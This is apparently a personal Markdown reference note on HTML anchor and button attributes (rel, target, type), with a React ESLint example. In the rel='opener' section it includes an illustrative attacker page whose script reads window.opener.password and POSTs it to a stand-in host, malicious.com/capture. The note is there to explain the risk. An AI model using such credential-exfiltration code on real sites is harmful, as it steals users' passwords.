---
tags:
  - web
  - html
  - development
---
# HTML

[HTML (Hypertext Markup Language)](https://developer.mozilla.org/en-US/docs/Web/HTML) defines the content and basic underlying structure of any web page.

## Tags

### `<a>`

The `<a>` or anchor tag defines a hyperlink in a page.

#### `href`

`href` [stands for HyperText Reference](https://www.w3.org/Provider/ServerWriter.html).

#### `rel`

[`rel` defines a relationship](https://developer.mozilla.org/en-US/docs/Web/HTML/Attributes/rel) between the anchor tag (or `<link>` or `<form>` or `<area>`) which it is on.

*Note: There is **no default** for `rel`, if it is omitted for `<a>` tags then there will be no defined relationship, but there will still be links created between the two.*

```html
<!-- This anchor's rel indicates it is a link to do with the author of the page. -->
<a rel="author" href="mailto:aaron@cute.engineer">Send me a message!</a>
```

##### `rel="opener"`

Until 2018 when [this issue was brought up](https://github.com/whatwg/html/issues/4078) and later in 2019 [when a fix was implemented across browsers](https://github.com/whatwg/html/pull/4330) this used to be the default behaviour for any link with `target="_blank"`.

This is worth knowing about, but won't come up very often. At all.

`rel="opener"` will set the `window.opener` attribute on the *new browsing context* to the `window` object of your current one.

This is almost *always* a bad idea.

Imagine old code which looks like this:
```html
<script>
	var passwordInput = document.getElementById("password");

	// Assume there's some code to keep this value up to date 😛
	var password = passwordInput.value;
</script>
<body>
	<form>
		<label for="password">Password:</label>
		<input type="password" id="password" />
		<input type="submit" />
	</form>

	<!-- This is the problem bit! -->
	<a rel="opener" href="malicious.com">Check out another website!</a>
</body>
```

Clicking through to *malicious.com* - even through [[CORS]], gives [[JavaScript]] on that page access to this pages' `window` object.

This becomes a *huge* issue when paired with the fact that the `var` keyword creates attributes on the `window`!

*malicious.com source:*
```html
<script>
	// It is literally this easy
	var password = window.opener.password;

	// Then we save it for later 😈
	fetch("https://malicious.com/capture", {
		method: "POST",
		body: JSON.stringify({ password }),
	});
</script>
<body>
	<h1>hahaha i took ur password, silly billy</h1>
</body>
```
#### `target`

Defines where to open the `href`, the values are relative to your current "*browsing context*" eg. current tab, window, or `<iframe>`.

- `_self` - Current context. **This is the default.**
- `_blank` - Historically a new window, but now usually means a new tab.

*Note: [`_blank` is not well liked](https://css-tricks.com/use-target_blank/). Don't use it unless you have a good reason.*

These targets exist, but are far less common, and are only relevant to pages rendered inside of nested `<iframe>`s:

- `_parent` - The parent browsing context. The next frame up.
- `_top` - The top-most ancestor browsing context. The top frame.

*Note: Both of these will default to `_self` if no ancestors exist.*

### `<button>`

```html
<!-- This button doesn't do anything on its own, but it is clickable! -->
<button type="button">Switch theme</button>
```

#### `type`

The `type` attribute defines the default behaviour of a `<button>`, and can have three possible values:
- `"submit"` - Attempt to submit a form associated with this button. **This is the default.**
- `"reset"` - Attempt to reset a form associated with this button (you will almost *never* need this).
- `"button"` - No default behaviour, let [[JavaScript]] handle the behaviour entirely.

There is an [[ESLint]] rule defined for this, [`react/button-has-type`](https://github.com/jsx-eslint/eslint-plugin-react/blob/master/docs/rules/button-has-type.md).

You'll only come across that rule when trying to plug `type` directly in from a prop:
```jsx
// This code is incorrect, and breaks react/button-has-type!
function Button({ type, children }) {
	return (
		<button type={type}>{children}</button>
	);
}
```

To fix it, ensure that `type` is only ever going to be a valid value:
```jsx
function Button({ isSubmitButton, children }) {
	return (
		<button type={isSubmitButton ? 'submit' : 'button'}>
			{children}
		</button>
	);
}
```